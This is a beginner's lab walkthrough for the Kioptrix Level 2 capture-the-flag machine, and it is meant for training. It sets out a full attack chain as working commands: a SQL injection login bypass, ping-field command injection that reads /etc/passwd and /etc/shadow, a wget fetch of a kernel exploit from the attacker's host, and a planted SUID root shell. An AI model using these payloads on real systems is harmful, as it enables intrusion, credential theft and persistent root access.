# Kioptrix Level 2 - Complete Beginner's Guide 🚀

**Welcome!** This guide will walk you through hacking Kioptrix Level 2 step-by-step. Don't worry if you're new to this - I'll explain everything in simple terms!

---

## 🎯 What You'll Learn

- How to find computers on a network
- How to scan for open services (like finding open doors in a building)
- How to exploit a login page (SQL Injection)
- How to run commands on someone else's computer (Command Injection)
- How to become the administrator (root) of the system

**Time needed:** 1-2 hours for beginners

---

## 📋 What You Need

- **Kali Linux** (your hacking computer)
- **Kioptrix Level 2 VM** (the target - download from VulnHub)
- Both machines on the same network
- A cup of coffee ☕ and patience!

---

## Step 1: Find the Target Computer 🔍

**What we're doing:** Finding Kioptrix on the network (like looking for a specific house on a street)

**Command to use:**
```bash
sudo netdiscover -r 192.168.101.0/24 -P
```

**Breaking it down:**
- `sudo` = Run as administrator (gives you more power)
- `netdiscover` = Tool that finds computers on the network
- `-r 192.168.101.0/24` = Look in this network range (change this to match YOUR network!)
- `-P` = Passive mode (quieter scanning)

**How to find YOUR network range:**
```bash
ip addr show
# Look for your IP address (something like 192.168.1.100)
# If your IP is 192.168.1.100, use 192.168.1.0/24
# If your IP is 192.168.101.13, use 192.168.101.0/24
```

**What you'll see:**
```
IP            MAC Address        Vendor
192.168.101.4   14:eb:b6:47:97:99  TP-Link
192.168.101.12  00:0c:29:78:70:c4  VMware, Inc.  ← This is our target!
```

**How to spot the target:**
- Look for "VMware, Inc." in the vendor column
- That's your Kioptrix machine!
- Write down that IP address (in my case: **192.168.101.12**)

---

## Step 2: Scan the Target 🔬

**What we're doing:** Checking what services are running (like checking what doors and windows are open in a house)

**Command:**
```bash
nmap -sV -sC -A -p- 192.168.101.12
```

**⚠️ IMPORTANT:** Replace `192.168.101.12` with YOUR target's IP address!

**What these flags mean:**
- `-sV` = Tell me what version of software is running
- `-sC` = Run default safety checks
- `-A` = Aggressive scan (get lots of info)
- `-p-` = Scan ALL ports (1-65535)

**This will take 5-10 minutes.** Go grab that coffee! ☕

**What you should see:**
```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 3.9p1
80/tcp   open  http      Apache 2.0.52
443/tcp  open  ssl/http  Apache 2.0.52
3306/tcp open  mysql     MySQL
```

**What this means:**
- **Port 22 (SSH)** = Remote login service (like a back door)
- **Port 80 (HTTP)** = Website (like the front door) ← We'll attack this!
- **Port 443 (HTTPS)** = Secure website
- **Port 3306 (MySQL)** = Database (where data is stored)

**Key finding:** 
- Linux Kernel: **2.6.9** (very old! = vulnerable!)
- Apache: **2.0.52** (ancient! = vulnerable!)
- PHP: **4.3.9** (super old! = vulnerable!)

**Remember:** Old software = Easy to hack! 🎯

---

## Step 3: Visit the Website 🌐

**What we're doing:** See what's on the website

**Open your browser and go to:**
```
http://192.168.101.12
```

(Replace with your target's IP)

**What you'll see:**
A simple login page with:
- Username box
- Password box
- Login button

**Try logging in with:**
- Username: `admin`
- Password: `password`

**Result:** Login failed! (As expected)

---

## Step 4: Hack the Login (SQL Injection) 💉

**What is SQL Injection?**
Imagine the website asks a database: "Is this username and password correct?"
We're going to trick it into saying "Yes!" even with the wrong password!

### Method 1: Using the Browser

**In the Username field, type:**
```
admin' OR '1'='1
```

**In the Password field, type:**
```
admin' OR '1'='1
```

**Click Login**

**🎉 Success!** You're now logged in without knowing the password!

### Method 2: Using Terminal (Cool Hacker Way)

```bash
curl -s "http://192.168.101.12/index.php" \
  -d "uname=admin' OR '1'='1" \
  -d "psw=admin' OR '1'='1" \
  -d "btnLogin=Login"
```

**What this command does:**
- `curl` = Tool to make web requests from terminal
- `-s` = Silent mode (don't show progress)
- `-d` = Data to send (like filling out a form)

**Why does this work?**

The website's code looks like this:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'
```

When we inject `admin' OR '1'='1`, it becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'admin' OR '1'='1'
```

Since `'1'='1'` is always TRUE, we get in! 🎯

---

## Step 5: Discover the Ping Tool 🏓

**After logging in, you'll see:**
A page that says "Ping a Machine on the Network" with:
- A text box
- A submit button

**What it does:**
This tool lets you ping (check if a computer is online) other machines.

**Test it:**
Type `127.0.0.1` (that's the computer talking to itself) and click Submit.

**You'll see:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.028 ms
```

**Good!** The ping works. Now let's break it! 😈

---

## Step 6: Command Injection Attack ⚡

**What we're doing:** Running our own commands on their computer!

### Understanding How It Works

The website probably runs a command like:
```bash
ping -c 3 YOUR_INPUT_HERE
```

In Linux, the semicolon `;` lets you run multiple commands:
```bash
ping 127.0.0.1; whoami
# This runs ping, THEN runs whoami
```

### Let's Try It!

**Method 1: Using the Browser**

In the ping box, type:
```
127.0.0.1; whoami
```

**Click Submit**

**You should see:**
```
PING 127.0.0.1...
apache
```

**🎉 SUCCESS!** The word "apache" means:
- You're running commands on their computer!
- You're doing it as the "apache" user (the web server)

### Method 2: Using Terminal (Recommended)

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; whoami" \
  -d "submit=submit"
```

### Try More Commands!

**See what computer it is:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; uname -a" \
  -d "submit=submit"
```

**Result:**
```
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```

**What this tells us:**
- Computer name: **kioptrix.level2**
- Kernel version: **2.6.9-55.EL** (from 2007! Very old!)
- Architecture: **i686** (32-bit)

**List files in current directory:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; ls -la" \
  -d "submit=submit"
```

**See who can log in to this computer:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; cat /etc/passwd" \
  -d "submit=submit"
```

**Important users you'll find:**
- `root` (uid=0) = The admin/boss
- `john` (uid=500) = Regular user
- `harold` (uid=501) = Regular user
- `apache` (uid=48) = Web server (that's us right now!)

---

## Step 7: Find Database Passwords 🔑

**What we're doing:** Reading the website's code to find passwords!

**Run this command:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; cat /var/www/html/index.php" \
  -d "submit=submit"
```

**What you're looking for:**
```php
mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
```

**🎉 JACKPOT!** We found credentials:
- **Username:** john
- **Password:** hiroshima

**What can we do with this?**
1. Log into the database
2. Try these credentials for SSH (remote login)
3. Use them later for privilege escalation

**Write these down!** They're super important!

---

## Step 8: Get Root Access (Become Admin) 👑

**What we're doing:** Using a kernel exploit to become the administrator (root)

### Understanding the Plan

1. We're currently "apache" (limited user)
2. We need to become "root" (admin/god mode)
3. The kernel (core of the operating system) is old and vulnerable
4. We'll use an exploit to trick it into giving us root powers

### Step 8.1: Download the Exploit on Kali

**On your Kali machine, open a new terminal:**

```bash
searchsploit linux kernel 2.6 privilege
```

**This shows you exploits.** We want **9542** (CVE-2009-2698).

**Download it:**
```bash
searchsploit -m 9542
```

**This saves it as:** `9542.c`

**Move it to /tmp:**
```bash
cp 9542.c /tmp/exploit.c
```

### Step 8.2: Host a Web Server

**Still on Kali, in /tmp directory:**
```bash
cd /tmp
python3 -m http.server 8888
```

**What this does:**
Creates a simple web server on your Kali machine so the target can download the exploit.

**Keep this terminal open!** Don't close it.

### Step 8.3: Download Exploit on Target

**Open a NEW terminal and run:**

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=8.8.8.8|wget http://YOUR_KALI_IP:8888/exploit.c -O /tmp/ex.c" \
  -d "submit=submit"
```

**⚠️ IMPORTANT:** 
- Replace `YOUR_KALI_IP` with your Kali machine's IP address!
- To find it: Run `ip addr show` on Kali
- Example: If your Kali IP is 192.168.101.13, use that

**The pipe `|` character** lets us bypass the ping and run wget directly.

**Wait 5 seconds**, then verify it downloaded:
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; ls -la /tmp/ex.c" \
  -d "submit=submit"
```

**You should see:**
```
-rw-r--r--  1 apache apache 2535 Nov  7  2025 /tmp/ex.c
```

**If you see "No such file":** Go back and check your wget command!

### Step 8.4: Compile the Exploit

**What is compiling?**
Converting the code (exploit.c) into a program the computer can run.

**Run this:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; cd /tmp; gcc ex.c -o rootme" \
  -d "submit=submit"
```

**What this does:**
- `cd /tmp` = Go to /tmp folder
- `gcc` = Compiler (turns .c code into a program)
- `ex.c` = Input file (our exploit code)
- `-o rootme` = Output file name

**Wait 10 seconds** (compilation takes time!)

**Check if it worked:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; ls -la /tmp/rootme" \
  -d "submit=submit"
```

**You should see:**
```
-rwxr-xr-x  1 apache apache 6930 Nov  7 21:32 /tmp/rootme
```

**The `x` means it's executable** (runnable). Perfect! 🎯

### Step 8.5: Run the Exploit

**Now for the moment of truth:**

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootme && cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash" \
  -d "submit=submit"
```

**What this command does:**
1. `/tmp/rootme` = Run the exploit (tries to become root)
2. `&&` = If successful, do the next command
3. `cp /bin/bash /tmp/rootbash` = Copy the bash shell
4. `chmod 4777 /tmp/rootbash` = Make it a SUID shell (runs as root!)

**The `4` in chmod 4777 is magic:** It's the SUID bit that makes the program run with root privileges!

### Step 8.6: Use Your Root Shell

**Check if we have our root shell:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; ls -la /tmp/rootbash" \
  -d "submit=submit"
```

**You should see:**
```
-rwsrwxrwx  1 root root 616248 Nov  7 21:40 /tmp/rootbash
```

**See the `s` in `-rwsr-xr-x`?** That's the SUID bit! It means this runs as root!

**Now test your root powers:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootbash -p -c 'whoami'" \
  -d "submit=submit"
```

**If you see "root":** 🎉🎉🎉 **YOU DID IT!** You're root!

---

## Step 9: Find the Flags 🚩

**What are flags?**
Flags are files that prove you completed the challenge. They usually contain a random string or message.

### Check Root's Directory

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootbash -p -c 'ls -la /root'" \
  -d "submit=submit"
```

### Read Root's Files

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootbash -p -c 'cat /root/*.txt'" \
  -d "submit=submit"
```

### Check /etc/shadow (Password File)

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootbash -p -c 'cat /etc/shadow'" \
  -d "submit=submit"
```

**This file contains encrypted passwords** - proof you're root!

### Find All Text Files

```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootbash -p -c 'find / -name flag.txt 2>/dev/null'" \
  -d "submit=submit"
```

---

## 🎓 What You Just Learned

### 1. **Network Discovery**
You used `netdiscover` to find computers on the network.

### 2. **Port Scanning**
You used `nmap` to find open services and their versions.

### 3. **SQL Injection**
You bypassed login by injecting `' OR '1'='1` into the form.

**Why it worked:**
The website didn't check your input properly. It just plugged your text directly into the database query.

### 4. **Command Injection**
You ran system commands by adding `;` followed by your command.

**Why it worked:**
The website ran your input as a system command without checking if it was safe.

### 5. **Privilege Escalation**
You exploited an old kernel vulnerability to become root.

**Why it worked:**
The kernel (2.6.9 from 2007) has known bugs that let regular users become administrators.

---

## 🛠️ Troubleshooting Guide

### Problem: "Can't find the target with netdiscover"
**Solution:**
- Make sure both VMs are on the same network
- Try: `sudo netdiscover -i eth0` (replace eth0 with your network interface)
- Check VirtualBox/VMware network settings (use "Bridged" or "NAT Network")

### Problem: "Exploit won't compile"
**Solution:**
- Make sure gcc is installed: `curl -s "http://IP/pingit.php" -d "ip=127.0.0.1; which gcc" -d "submit=submit"`
- Try a different exploit: Search for "9545" instead of "9542"

### Problem: "Commands not working"
**Solution:**
- Use pipe `|` instead of semicolon `;`
- Try: `ip=8.8.8.8|whoami` instead of `ip=127.0.0.1; whoami`

### Problem: "Can't become root"
**Solution:**
- The exploit might fail randomly - just try running it again
- Make sure you compiled it correctly
- Try Method 2: SSH as john (password: hiroshima) then run exploit locally

---

## 🎯 Quick Command Cheat Sheet

**Find Target:**
```bash
sudo netdiscover -r 192.168.X.0/24 -P
```

**Scan Target:**
```bash
nmap -sV -sC -A 192.168.X.X
```

**SQL Injection Login:**
```
Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

**Basic Command Injection:**
```bash
curl -s "http://IP/pingit.php" -d "ip=127.0.0.1; whoami" -d "submit=submit"
```

**Download Exploit:**
```bash
curl -s "http://IP/pingit.php" -d "ip=8.8.8.8|wget http://KALI_IP:8888/exploit.c -O /tmp/ex.c" -d "submit=submit"
```

**Compile:**
```bash
curl -s "http://IP/pingit.php" -d "ip=127.0.0.1; cd /tmp; gcc ex.c -o rootme" -d "submit=submit"
```

**Get Root:**
```bash
curl -s "http://IP/pingit.php" -d "ip=127.0.0.1; /tmp/rootme && cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash" -d "submit=submit"
```

---

## 🎊 Congratulations!

You just hacked your first vulnerable machine! Here's what makes you dangerous now:

✅ You can find computers on a network  
✅ You know how to scan for vulnerabilities  
✅ You understand SQL Injection  
✅ You can exploit command injection  
✅ You can compile and run exploits  
✅ You achieved root/administrator access  

**This is just the beginning!** 🚀

---

## 📚 Want to Learn More?

### Next Steps:
1. Try **Kioptrix Level 3** (slightly harder)
2. Learn about **Metasploit** (automated exploitation framework)
3. Study **privilege escalation** techniques
4. Learn **Python** for custom exploits

### Great Resources:
- **HackTheBox** - More hacking challenges
- **TryHackMe** - Beginner-friendly rooms
- **OverTheWire** - Command line challenges
- **OWASP Top 10** - Common web vulnerabilities

---

## ⚠️ Legal Disclaimer

**ONLY hack systems you own or have permission to test!**

Unauthorized hacking is:
- ❌ Illegal in most countries
- ❌ Can get you arrested
- ❌ Can result in huge fines
- ❌ Will ruin your career

**Use these skills for:**
- ✅ Learning in lab environments
- ✅ Bug bounty programs
- ✅ Penetration testing with permission
- ✅ Protecting your own systems

---

## 🙋 Common Questions

**Q: Why didn't my commands work?**
A: Make sure you're using the correct IP address and that the target is running!

**Q: Is this real hacking?**
A: Yes! These are real techniques used by penetration testers and security researchers.

**Q: Can I hack other systems now?**
A: NO! Only hack systems you own or have written permission to test. Otherwise it's a crime.

**Q: What if I get stuck?**
A: Re-read the steps carefully, check the troubleshooting section, or search for "Kioptrix Level 2 walkthrough" for more help.

**Q: How long should this take?**
A: For complete beginners: 2-4 hours. Don't rush! Take your time to understand each step.

---

## ✨ Final Tips

1. **Take notes!** Write down what each command does
2. **Break things!** Try different commands and see what happens
3. **Google everything!** Don't understand something? Look it up!
4. **Be patient!** Hacking takes time and practice
5. **Have fun!** This is supposed to be enjoyable! 😄

---

**You're now a hacker!** 🎉  
Keep practicing, keep learning, and most importantly - **stay legal!**

---

*Created with ❤️ for beginners*  
*Date: November 2025*  
*Difficulty: Beginner*  
*Estimated Time: 1-2 hours*

**Happy Hacking! 🚀**
